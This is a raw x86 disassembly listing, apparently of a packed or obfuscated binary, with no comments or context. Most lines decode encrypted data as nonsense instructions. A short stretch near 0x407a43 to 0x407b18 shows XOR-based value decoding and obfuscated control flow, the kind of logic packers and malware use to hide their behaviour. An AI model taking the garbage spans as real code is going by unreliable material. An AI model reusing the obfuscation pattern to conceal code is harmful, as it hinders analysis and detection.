  40741a:	es and edi,eax
  40741d:	fs push esp
  40741f:	(bad)  
  407420:	jge    0x4073cd
  407422:	cmp    al,0x1a
  407424:	cmp    BYTE PTR [ebx+0x31],cl
  407427:	adc    esp,DWORD PTR ds:0x744366fa
  40742d:	sbb    al,0xae
  40742f:	sub    eax,0xfc1f3d0a
  407434:	jo     0x40748f
  407436:	mov    DWORD PTR [ecx-0x76],ecx
  407439:	jb     0x40748d
  40743b:	lahf   
  40743c:	fdivr  DWORD PTR [ebp+0x74]
  40743f:	dec    esp
  407440:	add    eax,0x10
  407443:	retf   0x31df
  407446:	in     al,0x9f
  407448:	aad    0x7a
  40744a:	xchg   ebp,eax
  40744b:	retf   0x9efe
  40744e:	pop    es
  40744f:	cmp    eax,DWORD PTR [ebx-0x5216553e]
  407455:	in     al,0xb4
  407457:	sbb    al,0xef
  407459:	cmp    DWORD PTR [edi+0x61],ebx
  40745c:	jo     0x4073fc
  40745e:	loope  0x40745c
  407460:	shr    DWORD PTR [ebp+0x2d903135],cl
  407466:	cli    
  407467:	daa    
  407468:	or     ebx,ecx
  40746a:	mov    bh,0x97
  40746c:	mul    BYTE PTR [ebx-0x23]
  40746f:	stc    
  407470:	mov    gs:0xf93a9e42,al
  407476:	int    0xb5
  407478:	or     al,0x80
  40747a:	lods   eax,DWORD PTR ds:[esi]
  40747b:	jecxz  0x40740e
  40747d:	jmp    DWORD PTR [esi-0x69f9ebeb]
  407483:	jb     0x4074ff
  407485:	ret    0xd883
  407488:	mov    ebp,0x8b6b3bf4
  40748d:	fsubr  DWORD PTR [ebx]
  40748f:	ror    al,0x4a
  407492:	xchg   esp,eax
  407493:	test   BYTE PTR [ebx+ebp*1],al
  407496:	inc    esp
  407497:	ds sub eax,0x8d09ec38
  40749d:	xchg   edx,eax
  40749e:	sahf   
  40749f:	or     DWORD PTR [ebx+0x1b],esp
  4074a2:	sahf   
  4074a3:	sub    ch,BYTE PTR [edi+0x39]
  4074a6:	in     eax,dx
  4074a7:	sub    al,0x42
  4074a9:	xor    al,0xcb
  4074ab:	ds ins BYTE PTR es:[edi],dx
  4074ad:	pop    edx
  4074ae:	jnp    0x40747b
  4074b0:	mov    esi,0xa26189b2
  4074b5:	test   eax,0xcfc01773
  4074ba:	mov    ebx,0x81231248
  4074bf:	inc    esp
  4074c0:	popf   
  4074c1:	jb     0x407538
  4074c3:	xchg   ecx,eax
  4074c4:	or     ebp,DWORD PTR [edx+0x47]
  4074c7:	scas   al,BYTE PTR es:[edi]
  4074c8:	sub    al,0x5
  4074ca:	adc    eax,0x910281aa
  4074cf:	ins    DWORD PTR es:[edi],dx
  4074d0:	sbb    ebx,esi
  4074d2:	inc    edi
  4074d3:	jne    0x4074f2
  4074d5:	xchg   ebx,eax
  4074d6:	jb     0x4074f9
  4074d8:	icebp  
  4074d9:	lahf   
  4074da:	scas   al,BYTE PTR es:[edi]
  4074db:	je     0x407482
  4074dd:	xor    BYTE PTR [edx+0x425d43e7],al
  4074e3:	ins    DWORD PTR es:[edi],dx
  4074e4:	xchg   edi,eax
  4074e5:	je     0x407469
  4074e7:	test   BYTE PTR [ebx-0x20],bl
  4074ea:	pop    ebp
  4074eb:	retf   
  4074ec:	fs push eax
  4074ee:	dec    ecx
  4074ef:	xchg   ebx,eax
  4074f0:	inc    esi
  4074f1:	repz aas 
  4074f3:	test   eax,0x20a416e9
  4074f8:	push   0x20c2a0de
  4074fd:	adc    ebx,eax
  4074ff:	lea    ecx,[ecx]
  407501:	adc    DWORD PTR [esi],ecx
  407503:	outs   dx,BYTE PTR ds:[esi]
  407504:	xor    DWORD PTR [esi],edi
  407506:	cmp    al,0xbe
  407508:	or     bl,BYTE PTR [edi+eiz*4+0x3461aa7c]
  40750f:	stos   BYTE PTR es:[edi],al
  407510:	inc    DWORD PTR [edi]
  407512:	jle    0x407591
  407514:	mov    BYTE PTR [ebp+eax*1+0x6bb113b4],ch
  40751b:	dec    edi
  40751c:	sbb    eax,0xbb7cb2f3
  407521:	les    ecx,FWORD PTR [eax+0x3e]
  407524:	shl    DWORD PTR [edx+ebx*1-0x29],0xfd
  407529:	mov    edx,cs
  40752b:	and    al,0x67
  40752d:	ret    
  40752e:	(bad)  
  40752f:	mov    WORD PTR [esp+ebx*2+0x289256e7],gs
  407536:	shr    BYTE PTR [ecx],0xd
  407539:	xchg   edx,eax
  40753a:	mov    esp,eax
  40753c:	je     0x407599
  40753e:	xchg   esi,eax
  40753f:	fisub  WORD PTR [edx+0x2e]
  407542:	call   0xbf1:0xcfc5cc02
  407549:	mov    ebx,0xb781d3b7
  40754e:	add    eax,DWORD PTR [edx+edi*2-0x4a4b8da6]
  407555:	rol    DWORD PTR [ebx],cl
  407557:	add    BYTE PTR [ebp+0x5548a234],0x18
  40755e:	aam    0xd8
  407560:	fwait
  407561:	jo     0x40751b
  407563:	(bad)  
  407564:	ss and al,0x7d
  407567:	add    eax,0xe5f8a939
  40756c:	or     edi,esi
  40756e:	jbe    0x4075b5
  407570:	push   ebp
  407571:	jo     0x407547
  407573:	aas    
  407574:	and    eax,0x9c9afa3
  407579:	sbb    al,0xe7
  40757b:	xchg   ebp,eax
  40757c:	scas   eax,DWORD PTR es:[edi]
  40757d:	push   esi
  40757e:	push   0x4b
  407580:	and    DWORD PTR [ebx+0x5f],edx
  407583:	fst    QWORD PTR ds:0x5c475131
  407589:	cld    
  40758a:	retf   0x975c
  40758d:	mov    esp,0x1b7b30c4
  407592:	inc    ecx
  407593:	inc    edx
  407594:	mov    ebx,0x40f4d2d8
  407599:	mov    esp,0x1ca5c480
  40759e:	lods   al,BYTE PTR ds:[esi]
  40759f:	mov    ebp,0xfbcd8263
  4075a4:	push   es
  4075a5:	dec    ecx
  4075a6:	add    BYTE PTR [edi-0x2c],ch
  4075a9:	xchg   edi,eax
  4075aa:	mov    ebx,0xcc4edf33
  4075af:	stos   BYTE PTR es:[edi],al
  4075b0:	(bad)
  4075b3:	sahf   
  4075b4:	cld    
  4075b5:	dec    edx
  4075b6:	mov    dl,0x78
  4075b8:	pop    ebp
  4075b9:	mov    BYTE PTR es:[ebx+0x1c],0xd4
  4075be:	push   edx
  4075bf:	mov    edx,0x828c0045
  4075c4:	xor    eax,0xd30f6bb1
  4075c9:	mov    ah,0xc1
  4075cb:	(bad)  [ebp+eiz*2-0x12c914d7]
  4075d2:	xchg   edi,eax
  4075d3:	pop    edx
  4075d4:	loop   0x4075a1
  4075d6:	lods   eax,DWORD PTR ds:[esi]
  4075d7:	pushf  
  4075d8:	mov    ah,BYTE PTR [esi-0x20]
  4075db:	out    dx,al
  4075dc:	rcl    DWORD PTR [edi+0x55],0x13
  4075e0:	sbb    ah,BYTE PTR [ebp+0x42869e81]
  4075e6:	daa    
  4075e7:	scas   al,BYTE PTR es:[edi]
  4075e8:	fstp   TBYTE PTR ds:0x60d626e3
  4075ee:	mul    edi
  4075f0:	aad    0xd
  4075f2:	dec    edx
  4075f3:	je     0x4075f1
  4075f5:	in     al,dx
  4075f6:	(bad)  
  4075f8:	cs jae 0x40757d
  4075fb:	sar    BYTE PTR [ecx],1
  4075fd:	mov    bh,0x1d
  4075ff:	and    al,0x50
  407601:	stos   BYTE PTR es:[edi],al
  407602:	and    DWORD PTR [ebx+0xd],ebx
  407605:	cwde   
  407606:	sbb    eax,0x480148b1
  40760b:	(bad)  
  40760d:	inc    esi
  40760e:	pop    esp
  40760f:	jb     0x40762a
  407611:	out    dx,al
  407612:	into   
  407613:	loopne 0x40764e
  407615:	xor    BYTE PTR [ebx+0x5f1ec6b3],dl
  40761b:	call   0xba812925
  407620:	enter  0x66a4,0x13
  407624:	in     al,0x92
  407626:	rcl    BYTE PTR [eax],0x1d
  407629:	ins    BYTE PTR es:[edi],dx
  40762a:	inc    ebp
  40762b:	sub    eax,0xdc954bcc
  407630:	shl    BYTE PTR [eax],1
  407632:	mov    BYTE PTR [edi],dh
  407634:	add    DWORD PTR [ecx-0x7],eax
  407637:	imul   eax,DWORD PTR [edx],0xdb75a2fc
  40763d:	xor    edi,edi
  40763f:	pop    eax
  407640:	or     DWORD PTR [edx],ecx
  407642:	arpl   WORD PTR gs:[esi+0x2c],bx
  407646:	xor    eax,0x38f27032
  40764b:	pusha  
  40764c:	jbe    0x407643
  40764e:	jmp    0xec93b719
  407653:	dec    ebp
  407654:	cmp    eax,0xf2389b90
  407659:	push   0x7eda7ce6
  40765e:	std    
  40765f:	mov    esi,0xa50f0f75
  407664:	fild   DWORD PTR [edx-0x36]
  407667:	jno    0x407646
  407669:	mov    BYTE PTR ds:0xa64779d7,0xab
  407670:	adc    DWORD PTR [edi+0x5f],edx
  407673:	push   ebp
  407674:	inc    edx
  407675:	mov    bh,0xd7
  407677:	jae    0x407650
  407679:	iret   
  40767a:	stc    
  40767b:	sahf   
  40767c:	jb     0x407670
  40767e:	imul   ebx,ebx,0x2ec6e531
  407684:	mov    bl,0xf7
  407686:	loop   0x40760a
  407688:	cmp    dl,BYTE PTR [edi]
  40768a:	xchg   ecx,eax
  40768b:	push   es
  40768c:	push   edi
  40768d:	and    BYTE PTR [eax+0xe16c94c],0x19
  407694:	xor    al,0x49
  407696:	bnd ret 
  407698:	mov    ebx,ebx
  40769a:	or     BYTE PTR [edi+0x46],ch
  40769d:	xchg   esp,eax
  40769e:	xchg   edx,eax
  40769f:	dec    edx
  4076a0:	or     al,0xa5
  4076a2:	call   0x78ac5e07
  4076a7:	dec    ebx
  4076a8:	pusha  
  4076a9:	lods   eax,DWORD PTR ds:[esi]
  4076aa:	test   BYTE PTR [eax+0x39],bh
  4076ad:	pop    eax
  4076ae:	dec    ecx
  4076af:	lds    edx,FWORD PTR [eax-0x2f03e581]
  4076b5:	mov    edx,0x26992d97
  4076ba:	jg     0x40771c
  4076bc:	and    ch,BYTE PTR [ecx+edx*2]
  4076bf:	sub    DWORD PTR [ebp+0x79],0xffffffed
  4076c3:	xchg   esi,eax
  4076c4:	fstp   DWORD PTR [edx+0x26cdf703]
  4076ca:	dec    esi
  4076cb:	(bad)  
  4076cc:	pop    ebx
  4076cd:	mov    esi,0xcc8842f8
  4076d2:	jmp    0x407713
  4076d4:	xchg   DWORD PTR [eax+0x1],ebx
  4076d7:	mov    dl,0xf7
  4076d9:	ret    
  4076da:	pop    ecx
  4076db:	test   ch,bh
  4076dd:	das    
  4076de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076df:	stos   BYTE PTR es:[edi],al
  4076e0:	(bad)
  4076e4:	inc    ebp
  4076e5:	out    0x8e,eax
  4076e7:	inc    ebx
  4076e8:	pop    ss
  4076e9:	jl     0x407687
  4076eb:	pop    esi
  4076ec:	fstp   TBYTE PTR [esi-0x69]
  4076ef:	mov    BYTE PTR [edx-0x47],dh
  4076f2:	(bad)  [edi+0x61]
  4076f5:	push   ebp
  4076f6:	out    dx,eax
  4076f7:	shl    DWORD PTR [eax-0x4e],cl
  4076fa:	mov    ebx,0x6f1aff91
  4076ff:	cmp    DWORD PTR [eax+0x3f],ecx
  407702:	cmp    BYTE PTR [esi],bl
  407704:	jns    0x4076bf
  407706:	pushf  
  407707:	push   edi
  407708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407709:	call   0xe128:0x555e74c9
  407710:	sbb    BYTE PTR ds:0x1bd4ecd5,bh
  407716:	icebp  
  407717:	xor    BYTE PTR [eax+0x5e],bh
  40771a:	inc    edi
  40771b:	or     eax,0xa7c3b281
  407720:	test   al,0x26
  407722:	loope  0x407740
  407724:	test   eax,0x81ecce17
  407729:	inc    eax
  40772a:	dec    ecx
  40772b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40772c:	shr    BYTE PTR [edi-0x35],0x92
  407730:	into   
  407731:	repz push edx
  407733:	jge    0x4076da
  407735:	pop    ebx
  407736:	fidivr WORD PTR [eax+0x5f]
  407739:	lock jg 0x40775a
  40773c:	leave  
  40773d:	cmp    BYTE PTR [ebx],bl
  40773f:	adc    DWORD PTR ds:0x79b0ce0a,ecx
  407745:	dec    esp
  407746:	dec    ebx
  407747:	nop
  407748:	dec    esi
  407749:	jno    0x4077b6
  40774b:	sub    BYTE PTR [ecx+0x28917890],bh
  407751:	jns    0x4077aa
  407753:	add    esp,ebp
  407755:	loopne 0x407703
  407757:	sbb    al,bh
  407759:	test   DWORD PTR [ecx+ecx*4-0x67],ebx
  40775d:	ja     0x40772e
  40775f:	mov    cl,0x57
  407761:	xchg   ecx,eax
  407762:	stos   BYTE PTR es:[edi],al
  407763:	es popa 
  407765:	(bad)  
  407766:	add    ebx,ebx
  407768:	out    dx,eax
  407769:	retf   0xf4ea
  40776c:	add    al,0x98
  40776e:	sbb    eax,DWORD PTR [ebp+edx*8-0x46a1ea74]
  407775:	aam    0x3c
  407777:	psubq  mm2,QWORD PTR [ecx-0x4b]
  40777b:	cdq    
  40777c:	jg     0x4077a1
  40777e:	rcr    DWORD PTR [edi],1
  407780:	mov    ebx,0xdf1dcbcc
  407785:	and    bh,dh
  407787:	mov    ch,0x4b
  407789:	jge    0x40773b
  40778b:	mov    al,ds:0x3de55f97
  407790:	add    al,0x94
  407792:	pop    es
  407793:	adc    DWORD PTR [ebp+0xb2a812b],0x57
  40779a:	mov    edi,0x7c164f55
  40779f:	cmp    BYTE PTR [edx],ch
  4077a1:	dec    edx
  4077a2:	(bad)  
  4077a3:	(bad)  
  4077a6:	adc    cl,dl
  4077a8:	ret    
  4077a9:	imul   esp,DWORD PTR [edx-0x958d524],0xcc925fa
  4077b3:	dec    esi
  4077b4:	cmp    eax,0x35a02549
  4077b9:	lahf   
  4077ba:	jmp    0x9042:0xeb5ef438
  4077c1:	(bad)  
  4077c2:	mov    ds:0xe6e55520,eax
  4077c7:	xchg   edi,eax
  4077c8:	pop    ds
  4077c9:	cmp    dl,BYTE PTR [ebx-0x4eb3ad8d]
  4077cf:	pop    eax
  4077d0:	xchg   DWORD PTR [eax],eax
  4077d2:	inc    bp
  4077d4:	pop    ebp
  4077d5:	xchg   ecx,eax
  4077d6:	inc    eax
  4077d7:	call   0xe9a5:0xfab01ed0
  4077de:	add    al,0x68
  4077e0:	push   es
  4077e1:	ja     0x4077db
  4077e3:	inc    DWORD PTR [esi-0x55]
  4077e6:	xchg   edx,eax
  4077e7:	std    
  4077e8:	test   eax,0x8cbf8a7
  4077ed:	cs ins BYTE PTR es:[edi],dx
  4077ef:	cmp    edi,esi
  4077f1:	mov    ch,0x15
  4077f3:	fcomp  st(2)
  4077f5:	nop
  4077f6:	cld    
  4077f7:	test   BYTE PTR [ebp-0x1efc1cf],bh
  4077fd:	xchg   ecx,eax
  4077fe:	xor    al,0x5c
  407800:	mov    edx,esp
  407802:	push   0x179af96e
  407807:	xor    eax,0x527424bf
  40780c:	cmc    
  40780d:	mov    ah,dl
  40780f:	rcl    BYTE PTR [edx+edx*2-0x5d00ff6f],0xb6
  407817:	aaa    
  407818:	cmc    
  407819:	mov    ah,0xe5
  40781b:	mov    eax,0xd7ddbccf
  407820:	ret    
  407821:	mov    ecx,0xb65dc1e
  407826:	gs stos DWORD PTR es:[edi],eax
  407828:	fs (bad) 
  40782a:	idiv   DWORD PTR [edi+ebx*8+0x3]
  40782e:	mov    bl,0xd
  407830:	inc    ebp
  407831:	(bad)
  407834:	mov    eax,0xa9c8c985
  407839:	dec    edi
  40783a:	pop    eax
  40783b:	jno    0x4077ca
  40783d:	stos   DWORD PTR es:[edi],eax
  40783e:	mov    edx,0xf87ac90e
  407843:	ds dec edi
  407845:	adc    esp,edx
  407847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407848:	cmc    
  407849:	add    DWORD PTR [eax-0x6b],eax
  40784c:	pop    es
  40784d:	jns    0x407818
  40784f:	clc    
  407850:	push   eax
  407851:	and    ax,0x8c01
  407855:	xchg   edi,ebx
  407857:	mov    eax,ds:0xd94d1c7c
  40785c:	ret    0x772
  40785f:	add    bl,BYTE PTR [ecx+0x44]
  407862:	es pop ebp
  407864:	inc    edx
  407865:	dec    esp
  407866:	fiadd  DWORD PTR [ecx]
  407868:	mov    ecx,0x8841ca40
  40786d:	or     BYTE PTR [eax],dl
  40786f:	xchg   edx,eax
  407870:	or     eax,DWORD PTR [eax+0x11]
  407873:	jmp    0x4078ec
  407875:	jl     0x407805
  407877:	out    0x12,al
  407879:	(bad)  
  40787a:	xchg   esp,eax
  40787b:	mov    bh,0x98
  40787d:	cwde   
  40787e:	jmp    DWORD PTR [esi+0x1154f049]
  407884:	and    edi,DWORD PTR [esi-0x9]
  407887:	and    edx,0x65
  40788a:	mov    ebp,0xcdd0d0db
  40788f:	jmp    0x407893
  407891:	ins    BYTE PTR es:[edi],dx
  407892:	mov    ds:0x22a0ef1b,eax
  407897:	inc    edx
  407898:	push   edi
  407899:	push   edx
  40789a:	sbb    ch,BYTE PTR [ecx+0x2c]
  40789d:	xchg   DWORD PTR [ebx+0x6b],edi
  4078a0:	mov    eax,ds:0x80040943
  4078a5:	xor    bl,ch
  4078a7:	cmp    DWORD PTR [ecx-0x50709a35],edi
  4078ad:	push   esi
  4078ae:	jecxz  0x407835
  4078b0:	push   ebp
  4078b1:	pop    ss
  4078b2:	mov    eax,0x4a934fed
  4078b7:	jmp    0x4078f3
  4078b9:	sub    dl,ch
  4078bb:	mov    ecx,0xd04971d
  4078c0:	or     DWORD PTR [ebp+0x262299a4],0x6585eb8c
  4078ca:	nop
  4078cb:	fwait
  4078cc:	outs   dx,DWORD PTR ds:[esi]
  4078cd:	retf   
  4078ce:	cwde   
  4078cf:	cld    
  4078d0:	xchg   ebx,eax
  4078d1:	xchg   DWORD PTR [edi],esp
  4078d3:	add    dl,BYTE PTR [eax]
  4078d5:	imul   esi,esp,0xdedcb2cc
  4078db:	das    
  4078dc:	aam    0x12
  4078de:	pop    ebx
  4078df:	shr    esi,cl
  4078e1:	jno    0x407904
  4078e3:	(bad)  
  4078e4:	add    bl,bh
  4078e6:	mov    edx,0x50d70d71
  4078eb:	xchg   ebx,eax
  4078ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078ed:	add    cl,dl
  4078ef:	dec    ebp
  4078f0:	call   0xfd76c424
  4078f5:	mov    al,0x14
  4078f7:	stc    
  4078f8:	jmp    0x4e61156e
  4078fd:	jo     0x407960
  4078ff:	mov    gs,WORD PTR ds:[esi+0x3e554e75]
  407906:	xchg   edx,eax
  407907:	jmp    0xa805:0x5f0480d
  40790e:	ss stc 
  407910:	push   ebx
  407911:	xchg   esi,eax
  407912:	enter  0xbf99,0x70
  407916:	add    al,0x63
  407918:	adc    BYTE PTR [esi-0x362015d],0x78
  40791f:	push   DWORD PTR [edx+0x47e99d28]
  407925:	test   DWORD PTR [edx+eax*8+0x59],ebp
  407929:	(bad)  
  40792a:	test   al,0x9a
  40792c:	in     eax,0xbd
  40792e:	stc    
  40792f:	dec    ebx
  407930:	jmp    0x91fafe86
  407935:	shl    BYTE PTR [ecx],0x3
  407938:	arpl   dx,si
  40793a:	pop    ebx
  40793b:	push   ecx
  40793d:	xchg   esp,eax
  40793e:	pushf  
  40793f:	mov    dl,0xc3
  407941:	add    eax,0x48a6ae25
  407946:	mov    ds:0x5011d691,al
  40794b:	jns    0x40793c
  40794d:	ins    DWORD PTR es:[edi],dx
  40794e:	inc    edi
  40794f:	pop    esp
  407950:	xor    eax,0x4a9fdaa8
  407955:	and    esp,DWORD PTR [eax+edi*2+0x12]
  407959:	jns    0x407983
  40795b:	xchg   edx,eax
  40795c:	or     dl,ch
  40795e:	addr16 hlt 
  407960:	add    ebp,DWORD PTR [esi]
  407962:	sahf   
  407963:	arpl   WORD PTR [edx],bx
  407965:	pop    edx
  407966:	ror    ah,cl
  407968:	inc    esi
  407969:	mov    bh,0xb8
  40796b:	stos   BYTE PTR es:[edi],al
  40796c:	inc    ecx
  40796d:	adc    eax,0xdb9e6c22
  407972:	inc    edx
  407973:	push   es
  407974:	ficom  DWORD PTR [ebx]
  407976:	cli    
  407977:	call   0xe2e09870
  40797c:	jp     0x407947
  40797e:	mov    ah,0xcc
  407980:	shr    DWORD PTR [ecx+0x313ca62b],0x3c
  407987:	adc    dh,BYTE PTR [ecx]
  407989:	jb     0x4079e2
  40798b:	arpl   WORD PTR [edx+0x79],dx
  40798e:	fsubr  QWORD PTR [esi+0xe]
  407991:	inc    ebp
  407992:	inc    esp
  407993:	mov    ebp,0x6f0f0dc3
  407998:	not    eax
  40799a:	inc    ecx
  40799b:	rcr    ecx,cl
  40799d:	fsubr  QWORD PTR [esi+ebp*8+0x27]
  4079a1:	pop    ebx
  4079a2:	jl     0x40794d
  4079a4:	out    0x61,eax
  4079a6:	test   BYTE PTR [ecx+0x1f93c374],bh
  4079ac:	(bad)  
  4079ad:	enter  0x5275,0x1b
  4079b1:	outs   dx,DWORD PTR ds:[esi]
  4079b2:	pop    esp
  4079b3:	jp     0x407a2e
  4079b5:	sub    dh,ch
  4079b7:	cmp    dl,BYTE PTR [eax+0x11]
  4079ba:	adc    BYTE PTR [ebp-0x2819d459],ah
  4079c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079c1:	sub    ch,bl
  4079c3:	push   es
  4079c4:	xchg   bp,ax
  4079c6:	cwde   
  4079c7:	retf   
  4079c8:	and    al,0xbe
  4079ca:	setge  BYTE PTR [esi-0x6]
  4079ce:	(bad)  
  4079cf:	xor    eax,0x4dc93045
  4079d4:	xchg   DWORD PTR [ebp-0x7f930611],edx
  4079da:	in     eax,0xfc
  4079dc:	(bad)  
  4079dd:	dec    edi
  4079de:	pop    edx
  4079df:	push   ss
  4079e0:	pop    edx
  4079e1:	test   eax,0xddbdce68
  4079e6:	inc    ebp
  4079e7:	mov    ds:0x5719db48,al
  4079ec:	and    esp,DWORD PTR [ecx-0x62]
  4079ef:	lds    esi,FWORD PTR [ebx+eax*8-0x909903e]
  4079f6:	scas   eax,DWORD PTR es:[edi]
  4079f7:	or     eax,0xd154bd6a
  4079fc:	add    BYTE PTR [edx+ebp*8],dh
  4079ff:	mov    eax,ds:0x8aac93d2
  407a04:	and    eax,DWORD PTR [ebx]
  407a06:	inc    ecx
  407a07:	dec    eax
  407a08:	lods   al,BYTE PTR ds:[esi]
  407a09:	mov    eax,ds:0x70d830d3
  407a0e:	iret   
  407a0f:	lds    ebp,FWORD PTR [edi]
  407a11:	call   0x207ae2fa
  407a16:	leave  
  407a17:	mov    ss,ecx
  407a19:	sbb    ecx,0x37befc
  407a1f:	(bad)  
  407a20:	daa    
  407a21:	dec    ecx
  407a22:	ret    0xc0d2
  407a25:	sub    eax,0xf6ddcad1
  407a2a:	mov    cl,0xc2
  407a2c:	jmp    0x4061:0x268f1eec
  407a33:	rcl    DWORD PTR [ebx-0x201f5578],0x9c
  407a3a:	jg     0x407a67
  407a3c:	jb     0x4079e4
  407a3e:	lods   al,BYTE PTR ds:[esi]
  407a3f:	inc    ebp
  407a40:	fsub   st,st(6)
  407a42:	cli    
  407a43:	jmp    0x407a51
  407a45:	mov    ecx,DWORD PTR [ebp-0x4]
  407a48:	mov    edx,DWORD PTR [ebp-0x30]
  407a4b:	xor    ecx,ebx
  407a4d:	add    ecx,eax
  407a4f:	cmp    edx,ecx
  407a51:	je     0x407abe
  407a57:	lea    eax,[ebp-0x8]
  407a5a:	push   eax
  407a5b:	push   DWORD PTR [ebp-0x28]
  407a5e:	push   DWORD PTR [ebp+0xc]
  407a61:	call   0x40f238
  407a66:	mov    eax,0x3272dd
  407a6b:	mov    ecx,DWORD PTR [ebp-0x4]
  407a6e:	mov    edx,DWORD PTR [ebp-0x8]
  407a71:	xor    ecx,ebx
  407a73:	add    ecx,eax
  407a75:	cmp    edx,ecx
  407a77:	je     0x407a92
  407a7d:	mov    ecx,DWORD PTR [ebp-0x34]
  407a80:	movzx  ecx,WORD PTR [ecx+esi*2]
  407a84:	mov    edx,DWORD PTR [ebp-0x18]
  407a87:	mov    ecx,DWORD PTR [edx+ecx*4]
  407a8a:	mov    DWORD PTR [ebp-0x38],ecx
  407a8d:	jmp    0x4056db
  407a92:	mov    ecx,DWORD PTR [ebp-0x14]
  407a95:	xor    ecx,ebx
  407a97:	lea    esi,[esi+ecx*1+0x3272dd]
  407a9e:	jmp    0x40540c
  407aa3:	mov    eax,DWORD PTR [ebp-0x4]
  407aa6:	xor    eax,ebx
  407aa8:	add    eax,edi
  407aaa:	jmp    0x409f7a
  407aaf:	mov    eax,DWORD PTR [ebp-0x4]
  407ab2:	xor    eax,ebx
  407ab4:	add    eax,0x3272dd
  407ab9:	jmp    0x409f7a
  407abe:	mov    ecx,DWORD PTR [ebp-0x38]
  407ac1:	add    ecx,DWORD PTR [ebp+0x8]
  407ac4:	mov    DWORD PTR [ebp-0x10],ecx
  407ac7:	mov    ecx,DWORD PTR [ebp-0x1c]
  407aca:	test   ecx,ecx
  407acc:	je     0x409f05
  407ad2:	mov    DWORD PTR [ebp-0x20],0x0
  407ad9:	push   0x3
  407adb:	xor    edx,edx
  407add:	pop    edx
  407ade:	add    edx,0x8
  407ae1:	push   edx
  407ae2:	pop    ecx
  407ae3:	push   0x6
  407ae5:	dec    ecx
  407ae6:	pop    ebx
  407ae7:	dec    ebx
  407ae8:	xchg   ebx,ecx
  407aea:	sub    ebx,ecx
  407aec:	xchg   ebx,ecx
  407aee:	dec    ecx
  407aef:	mov    eax,DWORD PTR [ebp-0x1c]
  407af2:	imul   eax,ecx
  407af5:	sub    esp,eax
  407af7:	mov    DWORD PTR [ebp-0x20],esp
  407afa:	mov    eax,DWORD PTR [ebp-0x4]
  407afd:	mov    ecx,0x7510896
  407b02:	xor    eax,ecx
  407b04:	mov    edx,0x3272dd
  407b09:	add    eax,edx
  407b0b:	mov    DWORD PTR [ebp+0x8],eax
  407b0e:	mov    eax,DWORD PTR [ebp-0x14]
  407b11:	xor    eax,ecx
  407b13:	add    eax,edx
  407b15:	mov    edx,DWORD PTR [ebp+0x14]
  407b18:	jmp    0x409e70
  407b1d:	push   es
  407b1e:	or     DWORD PTR [esi],ebx
  407b20:	xchg   DWORD PTR [ecx],eax
  407b22:	xchg   DWORD PTR [ebx+0x7caff18b],ecx
  407b28:	xor    eax,0xf7e464a3
  407b2d:	nop
  407b2e:	and    BYTE PTR [edx+0x7a],bh
  407b31:	aaa    
  407b32:	pop    edi
  407b33:	jp     0x407baf
  407b35:	dec    esp
  407b36:	lahf   
  407b37:	cld    
  407b38:	mov    eax,ds:0xd08cc6ea
  407b3d:	cmp    dl,bl
  407b3f:	ins    DWORD PTR es:[edi],dx
  407b40:	xor    BYTE PTR [eax-0x4a],cl
  407b43:	inc    edx
  407b44:	out    0xdd,eax
  407b46:	ret    
  407b47:	add    al,0x8
  407b49:	jl     0x407b0e
  407b4b:	mov    BYTE PTR [edi-0x6bae9218],ch
  407b51:	ret    
  407b52:	add    BYTE PTR [ebx],dl
  407b54:	push   ss
  407b55:	jno    0x407b3c
  407b57:	scas   eax,DWORD PTR es:[edi]
  407b58:	mov    bh,BYTE PTR [edi]
  407b5a:	jmp    0x8535:0x7186b728
  407b61:	add    al,0x6b
  407b63:	add    DWORD PTR [ecx],ecx
  407b65:	sub    edx,esp
  407b67:	fcom   QWORD PTR [edi+0x22cc879d]
  407b6d:	pop    esi
  407b6e:	imul   ecx,DWORD PTR [edi+0x116a21e3],0x4b096fb2
  407b78:	mov    edx,0xf9ed4557
  407b7d:	je     0x407b02
  407b7f:	stc    
  407b80:	dec    esi
  407b81:	js     0x407b9b
  407b83:	push   ss
  407b84:	scas   al,BYTE PTR es:[edi]
  407b85:	mov    ?,WORD PTR [esi+0x65]
  407b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b89:	xchg   edx,eax
  407b8a:	dec    edi
  407b8b:	in     eax,dx
  407b8c:	cmc    
  407b8d:	fnstsw WORD PTR [ebp+edi*4-0x346ddb07]
  407b94:	pop    ecx
  407b95:	inc    ecx
  407b97:	mov    bh,0x3d
  407b99:	pusha  
  407b9a:	or     DWORD PTR [eax+0x18],ecx
  407b9d:	ja     0x407be5
  407b9f:	test   bl,dh
  407ba1:	or     al,0x8f
  407ba3:	mov    ah,0x0
  407ba5:	mov    eax,ds:0xec96494b
  407baa:	cmp    dh,BYTE PTR [edi+eax*8+0xf]
  407bae:	retf   0xa5e9
  407bb1:	mov    ch,0xe7
  407bb3:	xor    al,BYTE PTR [esi]
  407bb5:	jmp    esi
  407bb7:	dec    ebx
  407bb8:	xchg   BYTE PTR [ecx-0x4e26300c],ch
  407bbe:	leave  
  407bbf:	push   eax
  407bc0:	jbe    0x407b66
  407bc2:	jbe    0x407bc6
  407bc4:	shl    DWORD PTR ds:0xb21f3729,cl
  407bca:	imul   BYTE PTR [edx-0x8]
  407bcd:	and    eax,0x20c728f
  407bd2:	pusha  
  407bd3:	mov    cl,BYTE PTR [eax]
  407bd5:	push   edi
  407bd6:	inc    edx
  407bd7:	push   ecx
  407bd8:	sbb    BYTE PTR [edi],al
  407bda:	xlat   BYTE PTR ds:[ebx]
  407bdb:	mov    al,ds:0x3ee7465d
  407be0:	mov    eax,ds:0x9fd356eb
  407be5:	mov    ebp,0x7fb90816
  407bea:	jno    0x407c5d
  407bec:	push   es
  407bed:	(bad)  
  407bee:	xlat   BYTE PTR ds:[ebx]
  407bef:	push   eax
  407bf0:	and    ecx,ebx
  407bf2:	cs inc eax
  407bf4:	inc    esp
  407bf5:	pop    ss
  407bf6:	dec    eax
  407bf7:	xchg   ebx,eax
  407bf8:	stos   BYTE PTR es:[edi],al
  407bf9:	jge    0x407c19
  407bfb:	jmp    0x207c8c25
  407c00:	xor    esi,DWORD PTR [eax+0x6d112ef2]
  407c06:	mov    esp,0x6435dc63
  407c0b:	retf   0x3f02
